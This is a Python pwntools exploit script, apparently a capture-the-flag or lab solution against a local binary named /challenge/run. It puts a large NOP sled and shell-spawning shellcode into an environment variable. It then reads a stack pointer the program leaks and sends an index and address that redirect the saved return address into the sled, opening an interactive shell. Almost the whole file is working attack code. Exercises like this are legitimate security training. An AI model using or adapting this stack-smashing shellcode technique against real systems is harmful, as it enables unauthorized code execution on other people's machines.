#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template /challenge/run
import os
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or "/challenge/run")

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
tbreak main
continue
""".format(
    **locals()
)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     amd64-64-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX unknown - GNU_STACK missing
# PIE:      No PIE (0x400000)
# Stack:    Executable
# RWX:      Has RWX segments


# observed range of offsets from rsp to the target environment variable
# 0x2960, 0x24b0, 0x1a20, 0x1650, 0x1410, 0x1490

# NOP sled with comfortable room for error
sled_len = 0x5000
nop_sled = "\x90" * sled_len

shellcode = asm(shellcraft.sh())

payload = nop_sled + shellcode.decode("latin-1")
print("Payload length:", len(payload))

# place shellcode in environment to get around buffer limit
# os.environ["SHELLCODE_CMD"] = payload.decode('latin-1')
io = start(env={"SHELLCODE_CMD": payload})

# get rsp from program
io.recvuntil(b"pointer: ")
rsp_line = io.recvline()[:-1]
rsp_hex = int(rsp_line, 16)
print("Received rsp address:", rsp_line)

# distance to saved rip location from the array's location - check using GDB
rip_index = b"13"
io.sendline(rip_index)

# target shellcode
target_shellcode_sled = hex(rsp_hex + sled_len)[2:]
io.sendline(target_shellcode_sled.encode())

io.interactive()
